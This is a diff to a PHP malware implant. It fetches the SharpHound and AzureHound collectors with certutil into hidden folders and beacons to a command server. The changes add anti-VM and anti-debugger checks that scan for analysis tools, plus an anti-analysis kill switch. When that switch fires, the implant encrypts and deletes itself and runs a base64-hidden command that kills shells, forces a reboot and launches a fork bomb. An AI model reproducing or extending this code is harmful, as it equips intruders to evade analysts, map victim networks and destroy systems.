@@ -2,7 +2,7 @@
 ini_set('safe_mode', 0);
 umask(0);
 posix_setuid(0);
-define("UNPACKVEND", "cat ./vend.b64 | base64 -d >> vendor.zip && unzip ./vendor.zip && rm ./vendor.zip");
+define("UNPACKSELF", "");
 define("uuid", substr(base_convert(sha1(uniqid(mt_rand())), 16, 36), 0, 32));
 define("SELF_SCRIPT", $_SERVER["SCRIPT_FILENAME"]);
 define("HOME", getcwd());
@@ -32,7 +32,8 @@ while(1) {
     function checkfs()
     {
         if (substr(php_uname(), 0, 7) == 'Windows') {
-            $bh = array("af.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1", "af1.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1", "af2.exe" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true");/*certutil.exe -urlcache -split -f [URL] google_https_cert.exe && google_https_cert.exe*/
+            $bh = array("af.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1", "af1.ps1" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1", "af2.exe" => "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true");
+            /*certutil.exe -urlcache -split -f [URL] google_https_cert.exe && google_https_cert.exe*/
             $wh = new COM('WScript.Shell');
             if (is_null($wh->regRead("HKEY_LOCAL_MACHINE\\SOFTWARE\\SLTZ_NWLT1\\Path"))) {
                 $t = sys_get_temp_dir() . "\\" . uuid;
@@ -42,7 +43,7 @@ while(1) {
                 system("mkdir " . $t);
                 system("attrib +h +s " . $t);
                 foreach ($bh as $hound => $value) {
-                    system("Invoke-WebRequest -Uri $value -OutFile " . $t . "\\$hound");
+                    system("certutil.exe -urlcache -split -f $value " . $t . "\\$hound");
                 }
                 system("attrib +r +s $t\\*");
                 fwrite(fopen(sys_get_temp_dir() . "/aa", "a"), "win");
@@ -84,44 +85,192 @@ while(1) {
     }
 
     function checkSystems()
-    {/*add anti analysis checks here.*/
+    {
+        $foundDBGVM = array();
+        $chance_of_VM = 0;
+        if (substr(php_uname(), 0, 7) == 'Windows') {
+            $VMProcessList = array(
+                "vmsr" => "vmsrvc.exe",
+                "vmware" => "vmware.exe",
+                "vbox" => "vbox.exe",
+                "vmv" => "vmvss.exe",
+                "vmcs" => "vmscsi.exe",
+                "vmhg" => "vmhgfs.exe",
+                "vboxS" => "vboxservice.exe",
+                "vmxN" => "vmxnet.exe",
+                "vmx" => "vmx_svga.exe",
+                "vmmem" => "vmmemctl.exe",
+                "autoR" => "autoruns.exe",
+                "autoRSC" => "autorunsc.exe",
+                "vmusb" => "vmusbmouse.exe",
+                "vmT" => "vmtools.exe",
+                "regmo" => "regmon.exe",
+                "vboxT" => "vboxtray.exe",
+                "vmraw" => "vmrawdsk.exe",
+                "jBoxC" => "joeboxcontrol.exe",
+                "jBoxS" => "joeboxserver.exe",
+                "vmTool" => "vmtoolsd.exe",
+                "vmwareT" => "vmwaretray.exe",
+                "vmwareU" => "vmwareuser.exe",
+                "vmuSRV" => "vmusrvc.exe",
+                "xenS" => "xenservice.exe"
+            );
+            $DebugList = array(
+                "olly" => "ollydbg.exe",
+                "phacker" => "ProcessHacker.exe",
+                "fidd" => "fiddler.exe",
+                "tcpview" => "tcpview.exe",
+                "df5" => "df5serv.exe",
+                "fmon" => "filemon.exe",
+                "pmon" => "procmon.exe",
+                "rmon" => "regmon.exe",
+                "procEXP" => "procexp.exe",
+                "idag" => "idaq.exe",
+                "idag64" => "idaq64.exe",
+                "idbg" => "ImmunityDebugger.exe",
+                "wshark" => "Wireshark.exe",
+                "dumpcap" => "dumpcap.exe",
+                "hookexp" => "HookExplorer.exe",
+                "importRec" => "ImportREC.exe",
+                "petools" => "PETools.exe",
+                "lordpe" => "LordPE.exe",
+                "sysinsp" => "SysInspector.exe",
+                "procA" => "proc_analyzer.exe",
+                "sysA" => "sysAnalyzer.exe",
+                "sniffH" => "sniff_hit.exe",
+                "windbg" => "windbg.exe",
+                "prlCC" => "prl_cc.exe",
+                "prlTools" => "prl_tools.exe",
+                "xen" => "xenservice.exe"
+            );
+        }else{
+            $VMProcessList = array(
+                "vbox" => "virtualbox",
+                "vmware" => "vmware",
+                "qemu" => "qemu",
+                "jailctl" => "jailctl",
+                "ezjail" => "ezjail",
+                "iocage" => "iocage",
+                "qjail" => "qjail",
+                "jadm" => "jadm",
+                "cbsd" => "cbsd",
+                "bsnmp" => "bsnmp-jail",
+                "bsdploy" => "bsdploy",
+                "jailaudit" => "jailaudit",
+                "jailme" => "jailme",
+                "jailrc" => "jailrc",
+                "pkg_jail" => "pkg_jail",
+                "pam_jail" => "pam_jail"
+            );
+            $DebugList = array(
+                "zendbg" => "zendbg",
+                "xdebug" => "xdebug",
+                "xdbg" => "xdbg",
+                "gdb" => "gdb",
+                "ghidra" => "ghidra",
+                "mtrace" => "mtrace",
+                "memwatch" => "memwatch",
+                "mpatrol" => "mpatrol",
+                "dmalloc" => "dmalloc",
+                "dbgmem" => "dbgmem",
+                "valgrind" => "valgrind",
+                "efence" => "efence",
+                "adb" => "adb",
+                "strace" => "strace",
+                "ptrace" => "ptrace",
+                "pidof" => "pidof",
+                "jinx" => "jinx",
+                "sdb" => "sdb",
+                "xcode" => "xcode",
+                "rr" => "rr",
+                "ddd" => "ddd",
+                "tcpdump" => "tcpdump",
+                "tshark" => "tshark",
+                "wine" => "wine"
+            );
+            $uptime = strtok( exec( "cat /proc/uptime"), ".");
+            $upH = sprintf( "%2d", ( ($uptime % (3600*24)) / 3600) );
+            $upM = sprintf( "%2d", ($uptime % (3600*24) % 3600)%60  );
+            $fup = sprintf("%d:%d", $upH,$upM);
+            $cT = date('H:i');
+            $fT = $cT - $uptime;
+            $freeDisk = disk_free_space("/");
+            $totalFree = disk_total_space("/");
+            sleep(random_int(1,21)*5);
+            if ($upH < 1 ){
+                $chance_of_VM += 5;
+            }
+            if ($totalFree < 40){
+                $chance_of_VM += 5;
+            }
+            exec("ps ahxwwo pid,command", $p);
+            foreach ($VMProcessList as $key => $value){
+                if (strpos($p[0], $value)){
+                    array_push($foundDBGVM, $value);
+                }
+            }
+            foreach ($DebugList as $keyD => $val){
+                if (strpos($p[0], $val)){
+                    array_push($foundDBGVM, $val);
+                }
+            }
+            if (array_count_values($foundDBGVM) > 0 || $chance_of_VM >= 10){
+                return true;
+            }else{
+                return false;
+            }
+        }
+        return true;
     }
 
     function mainR()
     {
-        if (checkfs()) {
-            $ho = null;
-            $p = null;
-            $u = null;
-            $fp = fsockopen("$ho", $p, $errno, $errstr, 180);
-            switch (fread(fopen(sys_get_temp_dir() . "/aa", "r"), 3)) {
-                case "win":
-                    $au = array("ac" => "add", "iru" => SELF_SCRIPT, "u" => uuid, "o" => "windows");
-                    break;
-                case "lin":
-                    $au = array("ac" => "add", "iru" => SELF_SCRIPT, "u" => uuid, "o" => "lin");
-                    break;
-            }
-            foreach ($au as $key => $value) {
-                $poststring .= urlencode($key) . "=" . $value . "&";
-            }
-            $poststring = substr($poststring, 0, -1);
-            if (!$fp) {
-                fwrite(fopen(sys_get_temp_dir() . "/aaF", "a"), $errstr);
-            } else {
-                fputs($fp, "POST /diaghandler.php HTTP/1.1\r\n");
-                fputs($fp, "Host: $ho\r\n");
-                fputs($fp, "User-Agent: $u\r\n");
-                fputs($fp, "Connection: close\r\n");
-                fputs($fp, "Accept: */*\r\n");
-                fputs($fp, $poststring . "\r\n\r\n");
-                while (!feof($fp)) {
-                    fwrite(fopen(sys_get_temp_dir() . "/aaF", "a+"), fgets($fp, 4096));
+        if (checkSystems() === true) {
+            foreach (fgets(fopen(SELF_SCRIPT, "r+")) as $line) {
+                fputs(SELF_SCRIPT, openssl_encrypt($line, "aes-256-gcm", bin2hex(openssl_random_pseudo_bytes(128)), "", bin2hex(openssl_random_pseudo_bytes(256))));
                 }
-                fclose($fp);
+            fclose(SELF_SCRIPT);
+            unlink(SELF_SCRIPT);
+            exec(base64_decode("ZnVuY3Rpb24gZ3Rmbygpe2tpbGxhbGwgcGhwO2tpbGxhbGwgP3NoO2tpbGxhbGwgPz9zaDtlY2hvIDEgPi9wcm9jL3N5cy9rZXJuZWwvc3lzcnE7ZWNobyBiID4vcHJvYy9zeXNycS10cmlnZ2VyO2Jhc2ggIjooKSB7IDogfCA6ICY7fToifWd0Zm8oKQ=="));
+        } else {
+            if (!file_exists(sys_get_temp_dir() . "/aa")) {
+                sleep(random_int(1000, 10000));
+            } else {
+                if (checkfs()) {
+                    $ho = null;
+                    $p = null;
+                    $u = null;
+                    $fp = fsockopen("$ho", $p, $errno, $errstr, 180);
+                    switch (fread(fopen(sys_get_temp_dir() . "/aa", "r"), 3)) {
+                        case "win":
+                            $au = array("ac" => "add", "iru" => SELF_SCRIPT, "u" => uuid, "o" => "windows");
+                            break;
+                        case "lin":
+                            $au = array("ac" => "add", "iru" => SELF_SCRIPT, "u" => uuid, "o" => "lin");
+                            break;
+                    }
+                    foreach ($au as $key => $value) {
+                        $poststring .= urlencode($key) . "=" . $value . "&";
+                    }
+                    $poststring = substr($poststring, 0, -1);
+                    if (!$fp) {
+                        fwrite(fopen(sys_get_temp_dir() . "/aaF", "a"), $errstr);
+                    } else {
+                        fputs($fp, "POST /diaghandler.php HTTP/1.1\r\n");
+                        fputs($fp, "Host: $ho\r\n");
+                        fputs($fp, "User-Agent: $u\r\n");
+                        fputs($fp, "Connection: close\r\n");
+                        fputs($fp, "Accept: */*\r\n");
+                        fputs($fp, $poststring . "\r\n\r\n");
+                        while (!feof($fp)) {
+                            fwrite(fopen(sys_get_temp_dir() . "/aaF", "a+"), fgets($fp, 4096));
+                        }
+                        fclose($fp);
+                    }
+                } else {
+                    sleep(1000);
+                }
             }
-        }else{
-            sleep(1000);
         }
     }
     mainR();
